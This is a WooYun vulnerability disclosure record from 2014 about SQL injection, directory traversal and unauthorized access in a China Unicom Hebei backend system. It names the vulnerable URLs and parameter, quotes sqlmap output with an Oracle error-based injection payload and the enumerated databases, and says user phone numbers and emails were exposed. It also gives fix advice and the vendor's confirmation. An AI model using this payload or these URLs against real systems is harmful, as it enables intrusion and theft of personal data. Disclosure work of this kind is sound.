{"id": 42220, "wybug_id": "wooyun-2014-086409", "wybug_title": "联通万家某后台系统SQL注入+目录遍历+未授权访问", "wybug_corp": "联通万家", "wybug_author": "Mr.leo", "wybug_date": "2014-12-08 17:09", "wybug_open_date": "2015-01-22 17:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向公众公开  简要描述： 联通万家某后台系统SQL注入+目录遍历+未授权访问 详细说明：  http://b.ltyg.cn/BManage/SSO/DoLogin.aspx?check=1  河北联通综合信息管理系统1、sql注入http://b.ltyg.cn/EcManage/request/ShowLeaveword.aspx?ids=1 ids参数没有过滤sqlmap identified the following injection points with a total of 34 HTTP(s) requests:---Place: GETParameter: ids    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ids=1) AND 7504=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(103)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (7504=7504) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(101)||CHR(113)||CHR(58)||CHR(62))) FROM DUAL) AND (6419=6419---sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ids    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ids=1) AND 7504=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(103)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (7504=7504) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(101)||CHR(113)||CHR(58)||CHR(62))) FROM DUAL) AND (6419=6419---current user:    'COMM'current schema (equivalent to database on Oracle):    'COMM'available databases [8]:[*] COMM[*] CTXSYS[*] EXFSYS[*] MDSYS[*] OLAPSYS[*] SYS[*] SYSTEM[*] WMSYSsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ids    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: ids=1) AND 7504=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(108)||CHR(103)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (7504=7504) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(101)||CHR(113)||CHR(58)||CHR(62))) FROM DUAL) AND (6419=6419---Database: COMM[346 tables]345张表，2w+用户数，字段里面涉及qq号码、手机号码、邮箱地址部分数据\n\n\n\n2、目录遍历http://b.ltyg.cn/BManage/SSO/\n\n3、未授权访问http://b.ltyg.cn/BManage/\n\n\n\n   漏洞证明：  已经证明   修复方案：  1、过滤参数2、鉴权   版权声明：转载请注明来源 Mr.leo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-12-12 19:25 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给河北省分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-08 17:20 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @疯狗 狗哥，现在运营商都不走前台了？    \n     2014-12-08 17:23 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  好吧， 联通万家，一会再来一发。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}